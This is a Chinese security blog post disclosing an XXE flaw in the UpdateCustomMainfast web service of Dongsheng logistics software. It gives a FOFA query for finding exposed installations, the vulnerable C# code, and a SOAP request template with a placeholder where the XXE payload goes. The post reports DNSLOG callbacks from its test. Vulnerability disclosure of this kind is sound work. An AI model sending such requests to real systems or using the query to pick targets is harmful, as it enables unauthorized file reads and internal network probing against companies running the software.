---
title: "东胜物流软件 UpdateCustomMainfast XXE漏洞"
source: https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html
asset_dir: assets/东胜物流软件-updatecustommainfast-xxe漏洞
---

# 东胜物流软件 UpdateCustomMainfast XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/28 00:08
- 718浏览
- [2评论](#comment)
- 23分钟阅读

深入探索

SQL注入防护

安全

VPN服务

---

# 漏洞简介

东胜物流[软件](#)是一款广泛应用于物流行业的信息管理系统，主要用于货物运输、仓储管理以及供应链协同等场景，帮助企业实现物流业务的高效运作。该软件的 `UpdateCustomMainfast` 接口存在 XML 外部实体注入（[XXE](https://mrxn.net/tag/XXE "XXE")）漏洞，攻击者可以通过构造恶意的 XML 输入数据，触发该接口解析外部实体，从而读取服务器上的敏感文件或发起内部网络请求。成功利用该漏洞可能导致敏感信息泄露、系统配置暴露，甚至在特定环境下实现进一步的权限提升或系统控制，严重威胁企业数据安全和业务连续性。

软件

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

防火墙软件

Web安全书籍

编码转换工具

直接看 `UpdateCustomMainfast` 的实现逻辑

```
  public string UpdateCustomMainfast(
    string Xdoc,
    string XdocAfter,
    string Corpid,
    string SenderOp,
    string SenderHandphone,
    string SenderEmail,
    string SenderFax,
    string Mblno)
  {
    try
    {
      bool AfterDoc = false;
      string filename = Mblno;
      string str1 = filename + "_";
      string str2 = $"d:\\Manifest\\Sendmain\\{filename}.xml";
      string str3 = $"d:\\Manifest\\Sendmain\\{filename}.zip";
      string str4 = $"d:\\Manifest\\Sendafter\\{str1}.xml";
      string str5 = $"d:\\Manifest\\Sendafter\\{str1}.zip";
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.LoadXml(Xdoc);
```

参数 `Xdoc` 无任何过滤或校验，直接使用 `XmlDocument` 进行解析，造成[XXE](https://mrxn.net/tag/XXE "XXE")漏洞，朴实无华。

漏洞修复方案

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:UpdateCustomMainfast>
         <!--Optional:-->
         <dsw:Xdoc>XXEPOC</dsw:Xdoc>
         <!--Optional:-->
         <dsw:XdocAfter>1</dsw:XdocAfter>
         <!--Optional:-->
         <dsw:Corpid>1</dsw:Corpid>
         <!--Optional:-->
         <dsw:SenderOp>1</dsw:SenderOp>
         <!--Optional:-->
         <dsw:SenderHandphone>1</dsw:SenderHandphone>
         <!--Optional:-->
         <dsw:SenderEmail>1</dsw:SenderEmail>
         <!--Optional:-->
         <dsw:SenderFax>1</dsw:SenderFax>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
      </dsw:UpdateCustomMainfast>
   </soap:Body>
</soap:Envelope>
```

[![东胜物流软件 UpdateCustomMainfast XXE漏洞](images/img-001-62a4050a7286.webp)](https://image.mrxn.net/e778aa2c831746f68f2bec7beb29e4c6.webp)

成功在DNSLOG平台收到DNS和HTTP请求。

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
